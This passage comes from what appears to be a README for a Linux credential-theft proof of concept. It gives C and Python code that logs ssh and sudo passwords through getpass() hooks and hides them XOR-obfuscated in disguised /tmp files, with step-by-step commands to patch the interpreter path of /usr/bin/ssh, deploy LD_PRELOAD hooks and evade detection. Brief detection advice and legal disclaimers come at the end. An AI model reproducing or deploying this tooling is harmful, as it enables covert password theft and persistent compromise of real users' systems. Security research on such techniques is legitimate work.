    total_creds = cursor.fetchone()[0]
    print(f"Total credentials captured: {total_creds}")
```
**Purpose**: Generate intelligence summary from collected data
**Report Header**: Professional formatting for analysis presentation
**Total Count**: Provides overall scope of credential collection
**Database Query**: Uses SQL for efficient data aggregation

```python
cursor.execute("SELECT source, COUNT(*) FROM credentials GROUP BY source")
sources = cursor.fetchall()
print("\nBy source:")
for source, count in sources:
    print(f"  {source}: {count}")

cursor.execute("SELECT username, COUNT(*) FROM credentials GROUP BY username")
users = cursor.fetchall()
print("\nBy user:")
for user, count in users:
    print(f"  {user}: {count}")
```
**Purpose**: Provide breakdown analysis by attack vector and user
**Source Analysis**: Shows effectiveness of different capture methods
**User Analysis**: Identifies high-value or frequently targeted accounts
**Intelligence Value**: Reveals attack patterns and success rates

```python
cursor.execute('''
    SELECT timestamp, source, username, target 
    FROM credentials 
    ORDER BY timestamp DESC 
    LIMIT 10
''')
recent = cursor.fetchall()

print("\nRecent activity:")
for timestamp, source, username, target in recent:
    print(f"  {timestamp}: {source} - {username}@{target}")
```
**Purpose**: Show recent credential capture activity
**Timeline Analysis**: Orders by timestamp to show latest activity
**Activity Summary**: Provides quick overview of recent operations
**Context Display**: Shows source method and target information

### 4.2 Steganographer (`steganographer.c`) - Technical Breakdown

**Purpose**: Hide collected intelligence using steganographic techniques
**Execution Order**: Eighth (used throughout operation for data concealment)
**Stealth Function**: Prevents detection of intelligence collection

#### Code Block Analysis:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>
#include <sys/stat.h>

#define HIDDEN_DIR "/tmp/.system_data"
#define MAX_FILENAME 256
```
**Purpose**: Include system headers for file operations and steganography
**Hidden Directory**: Uses hidden directory name that appears system-related
**Camouflage**: Directory name suggests legitimate system data
**File Limit**: Prevents filename buffer overflows

```c
typedef struct {
    time_t timestamp;
    char source[32];
    char data[512];
} hidden_entry_t;
```
**Purpose**: Define structure for steganographic data storage
**Fields**:
- `timestamp`: When data was hidden
- `source`: Type of data (CREDENTIAL, SYSINFO, etc.)
- `data`: Actual intelligence payload
**Fixed Size**: Ensures consistent file structure for obfuscation

```c
void create_hidden_directory() {
    struct stat st = {0};
    if (stat(HIDDEN_DIR, &st) == -1) {
        mkdir(HIDDEN_DIR, 0700);
    }
}
```
**Purpose**: Create hidden directory for steganographic storage
**Permissions**: 0700 (owner only) restricts access to creating user
**Existence Check**: Only creates if directory doesn't already exist
**Access Control**: Prevents unauthorized access to hidden data

```c
char* generate_filename() {
    static char filename[MAX_FILENAME];
    time_t now = time(NULL);
    struct tm* tm_info = localtime(&now);
    
    snprintf(filename, sizeof(filename), "%s/.sys_%04d%02d%02d_%02d%02d%02d.dat",
             HIDDEN_DIR,
             tm_info->tm_year + 1900,
             tm_info->tm_mon + 1, 
             tm_info->tm_mday,
             tm_info->tm_hour,
             tm_info->tm_min,
             tm_info->tm_sec);
    
    return filename;
}
```
**Purpose**: Generate timestamped filenames that appear system-related
**Filename Format**: .sys_YYYYMMDD_HHMMSS.dat
**Camouflage**: Appears to be system data files
**Uniqueness**: Timestamp ensures no filename collisions
**Hidden Files**: Dot prefix hides files in normal directory listings

```c
void obfuscate_data(char* data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= 0xAA;
    }
}
```
**Purpose**: Simple XOR obfuscation to hide data content
**XOR Key**: 0xAA provides basic encryption
**Bidirectional**: Same function encrypts and decrypts
**Anti-Forensic**: Prevents casual inspection of file contents
**Lightweight**: Minimal overhead for real-time operations

```c
int store_hidden_data(const char* source, const char* data) {
    create_hidden_directory();
    
    hidden_entry_t entry;
    entry.timestamp = time(NULL);
    strncpy(entry.source, source, sizeof(entry.source) - 1);
    entry.source[sizeof(entry.source) - 1] = '\0';
    strncpy(entry.data, data, sizeof(entry.data) - 1);
    entry.data[sizeof(entry.data) - 1] = '\0';
```
**Purpose**: Prepare data for steganographic storage
**Timestamp Recording**: Captures when intelligence was collected
**Buffer Safety**: Ensures null termination to prevent overflows
**Source Tracking**: Records what type of intelligence this is
**Data Truncation**: Safely handles data larger than buffer

```c
obfuscate_data((char*)&entry, sizeof(entry));

char* filename = generate_filename();
int fd = open(filename, O_WRONLY | O_CREAT | O_EXCL, 0600);
if (fd == -1) {
    return -1;
}

write(fd, &entry, sizeof(entry));
close(fd);
```
**Purpose**: Obfuscate and write intelligence to hidden file
**Full Structure Encryption**: Obfuscates entire data structure
**Exclusive Creation**: O_EXCL prevents overwriting existing files
**Restrictive Permissions**: 0600 (owner read/write only)
**Atomic Write**: Single write operation reduces detection window

```c
int retrieve_hidden_data(const char* filename) {
    int fd = open(filename, O_RDONLY);
    if (fd == -1) {
        return -1;
    }
    
    hidden_entry_t entry;
    if (read(fd, &entry, sizeof(entry)) != sizeof(entry)) {
        close(fd);
        return -1;
    }
    close(fd);
    
    obfuscate_data((char*)&entry, sizeof(entry));
```
**Purpose**: Retrieve and decrypt hidden intelligence data
**File Validation**: Ensures file exists and is readable
**Size Validation**: Confirms complete data structure was read
**Decryption**: Same XOR operation decrypts obfuscated data
**Error Handling**: Returns failure if any step fails

```c
void hide_credential(const char* username, const char* password, const char* target) {
    char data[512];
    snprintf(data, sizeof(data), "USER:%s|PASS:%s|TARGET:%s", 
             username ? username : "unknown",
             password ? password : "unknown", 
             target ? target : "unknown");
    
    store_hidden_data("CREDENTIAL", data);
}
```
**Purpose**: Hide captured credentials using structured format
**Data Format**: Pipe-delimited fields for easy parsing
**Null Safety**: Handles NULL pointers gracefully
**Credential Type**: Marks data as credential intelligence
**High-Value Storage**: Preserves most critical intelligence type

```c
void hide_system_info() {
    char data[512];
    snprintf(data, sizeof(data), "PID:%d|USER:%s|CWD:%s", 
             getpid(), getlogin(), getcwd(NULL, 0));
    
    store_hidden_data("SYSINFO", data);
}
```
**Purpose**: Hide system context information
**Context Data**:
- PID: Process identifier
- USER: Current username
- CWD: Current working directory
**Environmental Intelligence**: Provides operational context
**System Fingerprinting**: Helps understand target environment

# COMPLETE ATTACK EXECUTION FLOW

## Phase-by-Phase Attack Execution

### Phase 1: Initial Compromise and Binary Patching

1. **Attacker gains initial access** (social engineering, vulnerability exploitation, etc.)
2. **Compile malicious loader**:
   ```bash
   gcc -o malicious_loader loader-patch/malicious_loader.c
   ```
3. **Identify target binaries** (commonly used programs like ssh, sudo, ls, etc.)
4. **Patch target binaries**:
   ```bash
   python3 patch_interp.py /usr/bin/ssh /tmp/ssh_patched ./malicious_loader
   cp /tmp/ssh_patched /usr/bin/ssh  # Replace original (requires privileges)
   ```

**What happens**: Every time the patched binary runs, the malicious loader executes first, logs the activity, installs hooks, then transfers control to the real program.

### Phase 2: Hook Deployment and Function Interception

5. **Compile hook libraries**:
   ```bash
   gcc -fPIC -shared -o ssh_hook.so credential-hooks/ssh_hook.c -ldl
   gcc -fPIC -shared -o sudo_hook.so credential-hooks/sudo_hook.c -ldl
   gcc -fPIC -shared -o got_hijacker.so got-hijacking/got_hijacker.c -ldl
   ```
6. **Deploy hooks** (via malicious loader or environment manipulation):
   ```bash
   export LD_PRELOAD="/path/to/hooks.so:$LD_PRELOAD"
   ```

**What happens**: When any program loads, the hooks intercept critical functions (getpass, printf, system) and redirect them to logging versions while maintaining normal operation.

### Phase 3: Credential Collection

7. **Passive collection begins** - hooks capture credentials automatically when users:
   - SSH to remote systems (`ssh user@host`)
   - Use sudo for privilege escalation (`sudo command`)
   - Run any programs that prompt for passwords

**What happens**: Every authentication attempt is silently logged to hidden files while users experience normal behavior.

### Phase 4: Intelligence Processing

8. **Process collected logs**:
   ```bash
   python3 credential_logger.py collect  # Aggregate all logs
   python3 credential_logger.py report   # Generate analysis
   ```
9. **Hide intelligence**:
   ```bash
   ./steganographer cred user1 pass123 server.example.com
   ./steganographer sysinfo  # Hide system context
   ```

**What happens**: Raw logs are processed into structured intelligence, analyzed for patterns, and hidden using steganographic techniques.

### Phase 5: Persistence and Evasion

10. **Maintain access** - malicious loader continues operating
11. **Evade detection** - hidden files appear as system data
12. **Collect ongoing intelligence** - hooks capture new credentials automatically

**What happens**: Attack infrastructure remains hidden and continues collecting intelligence indefinitely.

## Technical Execution Order (When User Runs 'ssh user@host')

```
1. Shell executes /usr/bin/ssh (patched binary)
   ↓
2. Kernel reads PT_INTERP → points to malicious_loader
   ↓  
3. malicious_loader executes:
   - Logs: "[LOADER] Executing: ssh user@host"
   - Installs GOT hooks for credential interception
   - Transfers control to real ld-linux.so
   ↓
4. Real dynamic linker loads SSH and libraries
   - SSH libraries load with hooks already in place
   - getpass() function pointer redirected to hooked_getpass()
   ↓
5. SSH prompts for password: "Password: "
   ↓
6. User types password
   ↓
7. hooked_getpass() executes:
   - Logs: "[TIMESTAMP] SSH_GETPASS: user=user, pass=secret123, target=host"
   - Calls original getpass() to continue normal SSH flow
   ↓
8. SSH continues normally - user doesn't suspect anything
   ↓
9. steganographer hides credential:
   - Creates: /tmp/.system_data/.sys_20231201_143022.dat
   - Stores obfuscated credential data
```

## Build and Usage

### Prerequisites

```bash
# Ubuntu/Debian
sudo apt-get install build-essential python3 sqlite3

# Red Hat/CentOS
sudo yum groupinstall "Development Tools"
sudo yum install python3 sqlite
```

### Quick Start

```bash
# Build all components
make all

# Run complete demonstration
make demo

# Test individual components
make test-loader
make test-got
make test-hooks
make test-stego
```

### Manual Usage Examples

#### 1. ELF Patching

```bash
# Compile malicious loader
gcc -o loader-patch/malicious_loader loader-patch/malicious_loader.c

# Patch a binary
python3 loader-patch/patch_interp.py /bin/ls ./patched_ls ./loader-patch/malicious_loader

# Run patched binary
./patched_ls
```

#### 2. GOT Hijacking

```bash
# Compile hijacker library
gcc -fPIC -shared -o got-hijacking/got_hijacker.so got-hijacking/got_hijacker.c -ldl

# Use with target program
LD_PRELOAD=./got-hijacking/got_hijacker.so /bin/ls
```

#### 3. Credential Interception

```bash
# Compile hooks
gcc -fPIC -shared -o credential-hooks/ssh_hook.so credential-hooks/ssh_hook.c -ldl
gcc -fPIC -shared -o credential-hooks/sudo_hook.so credential-hooks/sudo_hook.c -ldl

# Intercept SSH credentials
LD_PRELOAD=./credential-hooks/ssh_hook.so ssh user@host

# Intercept sudo credentials  
LD_PRELOAD=./credential-hooks/sudo_hook.so sudo -i
```

#### 4. Data Analysis

```bash
# Collect and analyze logs
python3 utils/credential_logger.py collect
python3 utils/credential_logger.py report
python3 utils/credential_logger.py export credentials.json
```

## Technical Deep Dive

### Attack Flow

1. **Initial Compromise**: Attacker gains limited access to target system
2. **Loader Patching**: Modifies critical system binaries to load malicious interpreter
3. **Hook Installation**: Malicious loader installs GOT/PLT hooks in all spawned processes
4. **Credential Harvesting**: Hooks intercept authentication functions and log credentials
5. **Data Exfiltration**: Collected data is hidden using steganographic techniques

### Defense Evasion

These techniques evade detection by:
- Operating at the loader level, before security tools initialize
- Not modifying running processes (no ptrace signatures)
- Using legitimate system mechanisms (dynamic linking)
- Hiding in trusted system locations
- Minimal file system artifacts

### Detection Strategies

Defenders can detect these attacks by:
- Monitoring ELF PT_INTERP modifications with file integrity tools
- Checking for unusual LD_PRELOAD usage
- Analyzing dynamic linking behavior
- Looking for credential logging artifacts in `/tmp/`
- Monitoring GOT/PLT modifications in memory

## File Structure

```
Code/
├── loader-patch/           # Phase 1: Binary Modification
│   ├── malicious_loader.c  # Replacement dynamic linker (executes first)
│   └── patch_interp.py     # ELF PT_INTERP patcher (preparation tool)
├── got-hijacking/          # Phase 2: Function Interception  
│   ├── got_hijacker.c      # GOT table hijacking library
│   └── plt_analyzer.c      # PLT/GOT forensic analysis tool
├── credential-hooks/       # Phase 3: Authentication Capture
│   ├── ssh_hook.c          # SSH credential interception
│   └── sudo_hook.c         # Sudo privilege escalation capture
├── utils/                  # Phase 4: Intelligence Processing
│   ├── credential_logger.py # Log aggregation and analysis
│   └── steganographer.c    # Steganographic data concealment
├── Makefile               # Complete build and testing system
└── README.md             # This comprehensive technical guide

# Execution Flow:
# 1. patch_interp.py modifies target binaries
# 2. malicious_loader executes when patched binary runs
# 3. Hook libraries intercept authentication functions
# 4. Credentials captured to hidden log files
# 5. credential_logger processes intelligence
# 6. steganographer hides data from detection
# 7. plt_analyzer provides forensic capabilities
```

## Advanced Evasion Techniques Demonstrated

### 1. Loader-Level Execution (Pre-Security Tool Initialization)
**Why it works**: Malicious code runs before any security monitoring tools initialize
**Evasion benefit**: No runtime process injection signatures
**Detection challenge**: Requires file integrity monitoring of system binaries

### 2. Legitimate System Mechanism Abuse
**Why it works**: Uses normal dynamic linking process
**Evasion benefit**: No suspicious API calls or process behavior
**Detection challenge**: Difficult to distinguish from normal system operation

### 3. Function Interposition vs Memory Patching
**Why it works**: Doesn't modify running process memory
**Evasion benefit**: No ptrace or memory scanning signatures
**Detection challenge**: Requires analysis of library loading behavior

### 4. Steganographic Data Hiding
**Why it works**: Hidden files appear as system data with obfuscated content
**Evasion benefit**: Survives casual forensic examination
**Detection challenge**: Requires deep file system analysis and pattern recognition

### 5. Zero-Persistence Binary Modification
**Why it works**: Modifies files on disk, not running processes
**Evasion benefit**: No memory-resident malware signatures
**Detection challenge**: Requires baseline comparison of system binaries

## Security Research Context

These techniques were discovered during an independent security assessment of critical infrastructure. The sophistication level demonstrates several critical points:

### 1. Nation-State vs Script-Kiddie Differentiation
**Script-Kiddie Approach**: 
- Uses obvious tools (mimikatz.exe, sharphound.exe)
- Creates obvious artifacts (suspicious process names)
- Relies on known exploits and techniques
- Generates security tool alerts

**Nation-State Approach (This POC)**:
- Operates at fundamental system levels
- Uses legitimate system mechanisms
- Leaves minimal forensic artifacts
- Evades signature-based detection
- Requires deep system knowledge to implement

### 2. Why Traditional Security Fails
**Signature-Based Detection**: Fails because code appears legitimate
**Behavioral Analysis**: Fails because behavior mimics normal system operation
**Memory Scanning**: Fails because no suspicious memory patterns exist
**Process Monitoring**: Fails because no unusual process activity occurs

### 3. Required Defensive Strategies
**File Integrity Monitoring**: Essential for detecting binary modifications
**Dynamic Analysis**: Must analyze library loading and function resolution
**Baseline Establishment**: Need known-good system state for comparison
**Deep Forensic Analysis**: Requires understanding of attack techniques
**Behavioral Correlation**: Must correlate multiple subtle indicators

### 4. Analyst Training Implications
**Technical Depth**: Analysts need deep understanding of system internals
**Tool Limitations**: Must understand what security tools cannot detect
**Attack Attribution**: Sophistication level helps identify threat actor capability
**Investigation Approach**: Requires different forensic techniques for advanced threats

## Comprehensive Learning Objectives

After studying this POC, security professionals should achieve deep understanding of:

### System-Level Attack Vectors
- **ELF Binary Structure**: How PT_INTERP modification enables pre-main execution
- **Dynamic Linking Process**: Why kernel trusts interpreter paths and how this creates attack surface
- **Memory Layout**: How TEXT, DATA, GOT, and PLT segments interact during program execution
- **Process Execution Flow**: Complete timeline from execve() to main() and interception points

### Advanced Persistence Mechanisms  
- **Binary Patching**: Modifying system files vs runtime process injection
- **Loader Hijacking**: Replacing dynamic linker vs traditional malware installation
- **Function Interposition**: LD_PRELOAD and GOT modification techniques
- **Steganographic Storage**: Hiding intelligence in legitimate-looking system files

### Credential Harvesting Techniques
- **Authentication Function Targeting**: Why getpass() is critical to intercept
- **Context Correlation**: Associating credentials with users, targets, and commands
- **Multi-Vector Collection**: SSH, sudo, and general authentication interception
- **Transparent Operation**: Maintaining normal user experience during collection

### Evasion and Anti-Detection
- **Pre-Security Execution**: Running before monitoring tools initialize
- **Legitimate Mechanism Abuse**: Using normal system functions for malicious purposes
- **Minimal Forensic Footprint**: Avoiding obvious indicators of compromise
- **Long-Term Persistence**: Surviving reboots and system updates

### Intelligence Analysis and Processing
- **Data Normalization**: Converting raw logs to structured intelligence
- **Pattern Recognition**: Identifying high-value targets and credentials
- **Operational Security**: Protecting collected intelligence from discovery
- **Exfiltration Preparation**: Formatting data for covert transmission

### Defensive Implications
- **Detection Challenges**: Why traditional security tools fail against these techniques
- **Required Countermeasures**: File integrity monitoring, behavioral analysis, deep forensics
- **Incident Response**: How to investigate and remediate loader-level compromises
- **Threat Attribution**: Using sophistication level to identify threat actor capabilities

### Code Analysis Skills
- **ELF Format Parsing**: Reading and modifying binary structures
- **Dynamic Symbol Resolution**: Understanding dlsym() and function interposition
- **Memory Protection Bypass**: Using mprotect() to modify read-only sections
- **Cross-Language Integration**: C hooks with Python analysis tools

### Operational Understanding
- **Attack Lifecycle**: From initial compromise to intelligence collection
- **Multi-Phase Coordination**: How different components work together
- **Scalability Considerations**: Deploying across multiple systems
- **Risk Assessment**: Understanding the true impact of system-level compromise

This knowledge enables security professionals to:
1. **Recognize advanced threats** that evade traditional detection
2. **Implement appropriate defenses** for system-level attacks  
3. **Conduct effective incident response** for sophisticated compromises
4. **Assess threat actor capabilities** based on technique sophistication
5. **Develop detection strategies** for novel attack vectors

## Cleanup

```bash
# Remove all built artifacts and logs
make clean

# Remove any installed hooks (if installed)
make remove-hooks
```

## Critical Security Warnings

### ⚠️ LEGAL COMPLIANCE
- Verify legal authorization before any testing
- Document all activities for compliance audits
- Ensure proper data handling and retention policies
- Follow responsible disclosure for any vulnerabilities found

### ⚠️ TECHNICAL SAFEGUARDS
- Test only in isolated environments with no network connectivity
- Use virtual machines with snapshots for safe rollback
- Monitor all activities to ensure containment
- Have incident response procedures ready

### ⚠️ ETHICAL CONSIDERATIONS
- Use only for improving defensive capabilities
- Share knowledge responsibly within security community
- Consider impact on affected systems and users
- Maintain professional ethical standards

## Technical References and Further Reading

### Core System Documentation
- [ELF Format Specification](http://refspecs.linuxbase.org/elf/elf.pdf) - Complete ELF binary format reference
- [System V ABI](https://refspecs.linuxfoundation.org/elf/x86_64-abi-0.99.pdf) - x86-64 specific implementation details
- [Dynamic Linking Guide](https://www.akkadia.org/drepper/dsohowto.pdf) - Comprehensive dynamic linking internals
- [Linux Loader Documentation](https://man7.org/linux/man-pages/man8/ld.so.8.html) - Dynamic linker operation

### Attack Technique Research
- [PLT/GOT Hijacking](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html) - Detailed GOT manipulation techniques
- [LD_PRELOAD Abuse](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/) - Function interposition methods
- [ELF Binary Modification](https://tmpout.sh/1/2.html) - Advanced binary patching techniques
- [Linux Process Internals](https://lwn.net/Articles/276395/) - Process execution and memory layout

### Defense and Detection
- [YARA Rules for ELF](https://yara.readthedocs.io/en/stable/modules/elf.html) - Binary analysis and detection rules
- [Osquery for System Monitoring](https://osquery.io/) - System state monitoring and forensics
- [AIDE File Integrity](https://aide.github.io/) - File system integrity monitoring
- [Sysmon for Linux](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon) - System monitoring and logging

### Advanced Topics
- [Return-Oriented Programming](https://en.wikipedia.org/wiki/Return-oriented_programming) - Code reuse attack techniques
- [Control Flow Integrity](https://clang.llvm.org/docs/ControlFlowIntegrity.html) - Modern defense mechanisms
- [Intel CET](https://software.intel.com/content/www/us/en/develop/articles/intel-cet-answers-call-protect-against-common-malware-threats.html) - Hardware-assisted security features
- [Linux Security Modules](https://www.kernel.org/doc/html/latest/admin-guide/LSM/) - Kernel security frameworks

### Incident Response and Forensics
- [Digital Forensics Framework](https://github.com/arxsys/dff) - Memory and disk analysis tools
- [Volatility Framework](https://www.volatilityfoundation.org/) - Memory forensics analysis
- [SANS DFIR](https://www.sans.org/digital-forensics-incident-response/) - Incident response methodologies
- [Sleuth Kit](https://www.sleuthkit.org/) - File system analysis tools

### Security Research Methodology
- [MITRE ATT&CK Framework](https://attack.mitre.org/) - Threat modeling and technique classification
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework) - Security program structure
- [Responsible Disclosure Guidelines](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html) - Ethical vulnerability reporting

---

*This research was conducted to advance defensive cybersecurity capabilities against sophisticated threat actors. All techniques are documented for educational purposes to improve protection of critical infrastructure and sensitive systems.*

**Remember: The best defense against advanced attacks is deep understanding of how they work.**